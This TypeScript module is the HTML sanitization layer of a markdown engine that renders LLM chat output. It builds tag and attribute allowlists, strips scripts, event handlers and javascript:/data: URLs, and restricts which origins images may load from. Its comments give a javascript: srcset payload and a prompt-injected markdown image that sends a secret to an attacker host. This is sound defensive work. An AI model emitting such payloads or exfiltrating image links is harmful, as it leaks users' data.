/**
 * Sanitization SSOT for the unified markdown engine.
 *
 * Layered defense (order matters, see engine.tsx):
 *   1. `escapeUnknownHtmlTags` — TEXT pre-pass. Escapes `<tag>`s outside the
 *      effective allowlist so LLM-emitted pseudo-tags (`<their>`, `<ticket>`)
 *      never reach React as unknown elements (React 19 crash guard).
 *      NOT a security boundary.
 *   2. `rehype-raw` parses remaining raw HTML into HAST.
 *   3. `rehypeSanitize` with `buildSanitizeSchema(...)` — the audited
 *      allow-list boundary (hast-util-sanitize) with a schema extended to
 *      exactly what our surfaces need.
 *   4. `rehypeStripUnsafe` — custom strip pass kept as defense-in-depth
 *      (srcset candidate scanning, iframe[srcdoc], belt-and-suspenders if
 *      the schema is ever loosened).
 *
 * COUPLED-ALLOWLIST INVARIANT (tested in __tests__/sanitize-invariant.test.ts):
 * `effectivePrePassTags ⊆ effectiveSanitizerTags`, both computed AFTER
 * merging `extraAllowedHtmlTags`. The pre-pass must never admit a raw tag
 * the sanitizer then silently drops. Both effective lists derive from the
 * shared sources in THIS module — never fork them.
 */
import { defaultSchema } from 'rehype-sanitize'
import { visit } from 'unist-util-visit'
import { defaultUrlTransform } from 'react-markdown'

// ---------------------------------------------------------------------------
// Shared tag allowlist (pre-pass baseline)
// ---------------------------------------------------------------------------
/**
 * Tags the TEXT pre-pass forwards as raw HTML. Anything outside this set
 * (plus per-composition `extraAllowedHtmlTags`) gets its angle brackets
 * escaped and renders as plain text.
 *
 * `video` is deliberately NOT in the baseline: chat strips <video>
 * server-side and playback goes through the <Video> SSOT. The rich
 * composition opts back in via `extraAllowedHtmlTags={['video', 'source']}`
 * so authored content (blog publisher video injection) keeps working.
 */
export const SAFE_HTML_TAGS = new Set([
  // Block + inline text
  'a', 'abbr', 'address', 'article', 'aside', 'b', 'bdi', 'bdo', 'blockquote',
  'br', 'caption', 'cite', 'code', 'col', 'colgroup', 'data', 'dd', 'del',
  'details', 'dfn', 'div', 'dl', 'dt', 'em', 'figcaption', 'figure', 'footer',
  'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'header', 'hgroup', 'hr', 'i', 'ins',
  'kbd', 'li', 'main', 'mark', 'nav', 'ol', 'p', 'pre', 'q', 'rp', 'rt',
  'ruby', 's', 'samp', 'section', 'small', 'span', 'strong', 'sub', 'summary',
  'sup', 'table', 'tbody', 'td', 'tfoot', 'th', 'thead', 'time', 'tr', 'u',
  'ul', 'var', 'wbr',
  // Media ('video' intentionally excluded — see the header comment)
  'img', 'picture', 'source', 'audio', 'iframe', 'track',
  // Forms (rehype-raw allows them; mostly harmless for chat output)
  'button', 'input', 'label', 'select', 'option', 'optgroup', 'textarea', 'form', 'fieldset', 'legend',
])

/** Effective pre-pass tag set for a composition. */
export function buildEffectiveTagSet(extraAllowedHtmlTags?: string[]): Set<string> {
  if (!extraAllowedHtmlTags?.length) return SAFE_HTML_TAGS
  const merged = new Set(SAFE_HTML_TAGS)
  for (const tag of extraAllowedHtmlTags) merged.add(tag.toLowerCase())
  return merged
}

// ---------------------------------------------------------------------------
// rehype-sanitize schema (allow-list boundary)
// ---------------------------------------------------------------------------
/**
 * Per-tag attribute allowances layered on top of hast-util-sanitize's
 * defaultSchema. Property names are hast camelCase. Attribute survival
 * matters as much as tag survival — an attribute-stripped `<video>` is a
 * sourceless player (see plan: "video-survives-sanitize fixture").
 */
const EXTRA_ATTRIBUTES: Record<string, Array<string | [string, ...unknown[]]>> = {
  '*': ['className', 'id', 'data*', 'dir', 'title', 'lang'],
  a: ['target', 'rel', 'href'],
  td: ['colSpan', 'rowSpan', 'align'],
  th: ['colSpan', 'rowSpan', 'align', 'scope'],
  img: ['src', 'srcSet', 'sizes', 'alt', 'width', 'height', 'loading', 'decoding'],
  iframe: ['src', 'width', 'height', 'allow', 'allowFullScreen', 'frameBorder', 'loading', 'referrerPolicy'],
  video: ['src', 'poster', 'controls', 'width', 'height', 'loop', 'muted', 'autoPlay', 'playsInline', 'preload'],
  source: ['src', 'type', 'media', 'srcSet', 'sizes'],
  audio: ['src', 'controls', 'loop', 'muted', 'preload'],
  track: ['src', 'kind', 'srcLang', 'label', 'default'],
  time: ['dateTime'],
  details: ['open'],
  // Form elements (allow the benign presentational subset)
  input: ['type', 'checked', 'disabled', 'name', 'value', 'placeholder', 'readOnly'],
  button: ['type', 'disabled', 'name', 'value'],
  select: ['disabled', 'multiple', 'name'],
  option: ['value', 'selected', 'disabled'],
  optgroup: ['label', 'disabled'],
  textarea: ['rows', 'cols', 'placeholder', 'disabled', 'readOnly', 'name'],
  label: ['htmlFor'],
  col: ['span'],
  colgroup: ['span'],
}

export interface BuildSanitizeSchemaOptions {
  extraAllowedHtmlTags?: string[]
}

/**
 * The engine's sanitize schema: defaultSchema ∪ SAFE_HTML_TAGS ∪ extras.
 * - `extraAllowedHtmlTags` is unioned into tagNames here AND into the
 *   pre-pass set (buildEffectiveTagSet) — the coupled-allowlist invariant.
 * - `clobberPrefix: ''` + empty `clobber`: authored raw-HTML anchors
 *   (`<h2 id="…">`) keep their ids so `[jump](#anchor)` deep-links work.
 *   (The renderer's own heading ids are injected at the React layer,
 *   post-rehype, and were never affected.)
 * - `card`/`mention` protocols registered for href so chat markers survive
 *   (the urlTransform below is the second gate).
 */
export function buildSanitizeSchema(options: BuildSanitizeSchemaOptions = {}) {
  const tagNames = new Set<string>([
    ...(defaultSchema.tagNames ?? []),
    ...SAFE_HTML_TAGS,
  ])
  for (const tag of options.extraAllowedHtmlTags ?? []) tagNames.add(tag.toLowerCase())

  const attributes: Record<string, Array<string | [string, ...unknown[]]>> = {
    ...(defaultSchema.attributes as Record<string, Array<string | [string, ...unknown[]]>>),
  }
  for (const [tag, attrs] of Object.entries(EXTRA_ATTRIBUTES)) {
    attributes[tag] = [...(attributes[tag] ?? []), ...attrs]
  }

  return {
    ...defaultSchema,
    tagNames: [...tagNames],
    attributes,
    clobberPrefix: '',
    clobber: [],
    protocols: {
      ...defaultSchema.protocols,
      href: [...(defaultSchema.protocols?.href ?? []), 'card', 'mention'],
    },
  }
}

// ---------------------------------------------------------------------------
// rehypeStripUnsafe — defense-in-depth strip pass (kept verbatim from the
// pre-unification SimpleMarkdownRenderer)
// ---------------------------------------------------------------------------
const EVENT_HANDLER_ATTR_RE = /^on[a-z]+$/i
const JAVASCRIPT_URL_RE = /^[\s\x00-\x1f]*javascript:/i
const DATA_URL_RE = /^[\s\x00-\x1f]*data:/i
const URL_ATTRS = new Set([
  'href',
  'src',
  'srcset',
  'formaction',
  'xlink:href',
  'poster',
  'data',
  'action',
  'background',
])

/**
 * Returns true if any candidate in an `srcset` attribute has a dangerous
 * URL scheme. srcset is a comma-separated candidate list — a single-URL
 * check would miss a malicious second candidate
 * (`"https://safe.png 1x, javascript:alert(1) 2x"`). Over-splitting on
 * commas inside URL paths over-strips, which is the correct error bias.
 */
function srcsetHasUnsafeCandidate(srcset: string): boolean {
  for (const candidate of srcset.split(',')) {
    const url = candidate.trim().split(/\s+/)[0] ?? ''
    if (JAVASCRIPT_URL_RE.test(url) || DATA_URL_RE.test(url)) return true
  }
  return false
}

const STRIP_ELEMENTS = new Set([
  'script',
  'style',
  'noscript',
  'noembed',
  'object',
  'embed',
  'applet',
  'base',
  'meta',
])

export function rehypeStripUnsafe() {
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  return (tree: any) => {
    visit(tree, 'element', (node: any, index: number | undefined, parent: any) => {
      const tag = String(node.tagName ?? '').toLowerCase()
      if (STRIP_ELEMENTS.has(tag)) {
        if (parent && typeof index === 'number') {
          parent.children.splice(index, 1)
          // Return the numeric index so the walker resumes at the slot the
          // removed node vacated.
          return index
        }
        // Root-level strip element — neutralize in place.
        node.children = []
        node.tagName = 'span'
        node.properties = {}
        return
      }
      if (!node.properties || typeof node.properties !== 'object') return
      for (const key of Object.keys(node.properties)) {
        if (EVENT_HANDLER_ATTR_RE.test(key)) {
          delete node.properties[key]
          continue
        }
        if (URL_ATTRS.has(key.toLowerCase())) {
          const raw = node.properties[key]
          const v = Array.isArray(raw) ? raw[0] : raw
          if (typeof v === 'string') {
            const unsafe =
              key.toLowerCase() === 'srcset'
                ? srcsetHasUnsafeCandidate(v)
                : JAVASCRIPT_URL_RE.test(v) || DATA_URL_RE.test(v)
            if (unsafe) {
              delete node.properties[key]
              continue
            }
          }
        }
        if (tag === 'iframe' && key.toLowerCase() === 'srcdoc') {
          delete node.properties[key]
        }
      }
    })
  }
}

// ---------------------------------------------------------------------------
// escapeUnknownHtmlTags — TEXT pre-pass (React 19 crash guard)
// ---------------------------------------------------------------------------
// ReDoS-safe shape (CodeQL polynomial-regex hardening): every quantifier is
// hard-bounded (tag name ≤63 chars, attrs ≤4096) so matching is
// constant-time per tag. Anything longer falls through as plain text —
// the safe-degrade behavior for HTML-in-markdown.
const TAG_LIKE_REGEX = /<(\/?)([a-zA-Z][a-zA-Z0-9-]{0,63})((?:\s[^>]{0,4096}?)?)(\/?)>/g

export function escapeUnknownHtmlTags(
  text: string,
  allowedTags: Set<string> = SAFE_HTML_TAGS,
): string {
  if (!text || text.indexOf('<') === -1) return text
  // Carve out fenced code blocks AND inline-backtick spans so `<their>`
  // examples inside code are preserved verbatim.
  const parts: string[] = []
  let cursor = 0
  const PROTECTED_SPAN_RE = /```[\s\S]*?```|`[^`\n]+`/g
  let span: RegExpExecArray | null
  while ((span = PROTECTED_SPAN_RE.exec(text)) !== null) {
    if (span.index > cursor) {
      parts.push(escapeOutsideFences(text.slice(cursor, span.index), allowedTags))
    }
    parts.push(span[0])
    cursor = span.index + span[0].length
  }
  if (cursor < text.length) {
    parts.push(escapeOutsideFences(text.slice(cursor), allowedTags))
  }
  return parts.join('')
}

function escapeOutsideFences(segment: string, allowedTags: Set<string>): string {
  return segment.replace(TAG_LIKE_REGEX, (match, slash, tag, rest, selfClose) => {
    const lower = (tag as string).toLowerCase()
    if (allowedTags.has(lower)) return match
    return `&lt;${slash}${tag}${rest}${selfClose}&gt;`
  })
}

// ---------------------------------------------------------------------------
// URL transform + LLM-surface URL policy
// ---------------------------------------------------------------------------
/**
 * Extends react-markdown's default safe-protocol allowlist with the two
 * internal schemes the chat remark plugins emit (`card://`, `mention://`),
 * for `href` ONLY. All other URLs go through `defaultUrlTransform`.
 */
export function cardAwareUrlTransform(url: string, key: string): string {
  if (key === 'href' && typeof url === 'string' && (url.startsWith('card://') || url.startsWith('mention://')))
    return url
  return defaultUrlTransform(url)
}

/**
 * Exfiltration defense for LLM-rendered surfaces: images auto-load on
 * render, so a prompt-injected `![](https://attacker/log?d=<secret>)`
 * exfiltrates silently. Chat compositions pass an origin allowlist;
 * content compositions (authored markdown) pass `'all'`.
 */
export interface MarkdownUrlPolicy {
  /** Origins allowed to auto-load as images. `'all'` disables filtering. */
  allowedImageOrigins?: string[] | 'all'
  /** What to render for a blocked image: drop entirely or show a placeholder. */
  onBlockedUrl?: 'drop' | 'placeholder'
}

export function isImageSrcAllowed(src: string, policy?: MarkdownUrlPolicy): boolean {
  if (!policy || policy.allowedImageOrigins === 'all' || policy.allowedImageOrigins === undefined) return true
  // Relative URLs resolve same-origin — always allowed.
  if (src.startsWith('/') && !src.startsWith('//')) return true
  try {
    const origin = new URL(src).origin
    return policy.allowedImageOrigins.some((allowed) => {
      try {
        return new URL(allowed).origin === origin
      } catch {
        return allowed === origin
      }
    })
  } catch {
    // Unparseable / partially-streamed URL: not a completed URL token —
    // do not load (policy evaluates only terminated URLs).
    return false
  }
}
